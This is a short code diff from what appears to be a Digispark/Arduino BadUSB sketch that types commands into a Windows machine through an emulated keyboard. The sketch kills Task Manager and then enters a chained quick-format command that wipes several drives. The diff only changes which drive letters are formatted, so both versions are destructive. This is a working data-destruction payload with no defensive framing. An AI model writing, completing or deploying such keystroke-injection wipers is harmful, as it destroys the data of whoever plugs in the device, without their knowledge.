@@ -18,7 +18,7 @@ void loop() {
   DigiKeyboard.delay(200);
   DigiKeyboard.println("taskkill /IM \"taskmgr.exe\" /F ");
   DigiKeyboard.delay(500);
-  DigiKeyboard.println("format D:/q /y && format E:/q /y && format F:/q /y && format C:/q /y && exit");
+  DigiKeyboard.println("format D:/q /y && format E:/q /y && format F:/q /y && format G:/q /y && exit");
   digitalWrite(1, HIGH);
   for(;;){ }
 }
